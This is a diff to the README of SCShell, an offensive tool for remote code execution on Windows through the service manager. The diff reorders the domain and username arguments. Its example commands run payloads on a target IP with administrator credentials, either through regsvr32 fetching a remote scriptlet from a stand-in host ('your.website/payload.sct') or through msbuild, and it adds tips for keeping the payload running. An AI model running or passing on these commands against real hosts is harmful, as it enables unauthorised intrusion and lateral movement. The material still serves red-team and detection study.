@@ -24,21 +24,21 @@ The current build is written in `C` but I will port it to `C#` and `PowerShell`.
 
 ```
 Usage:
-SCShell.exe target service payload username domain password
+SCShell.exe target service payload domain username password
 ```
 
 `target` can be set to `local` to run the payload locally
 
 Remote execution
 ```
-SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" administrator . Password
+SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" . administrastor Password
 ```
 
 I recommend using `C:\windows\system32\cmd.exe /c` to make sure to payload will not be killed once the service stop. You NEED to use the full path.
 
 You can also use a msbuild payload
 ```
-SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj" administrator . Password
+SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj" . administrator Password
 SCShell ***
 Trying to connect to 192.168.197.131
 Username was provided attempting to call LogonUserA
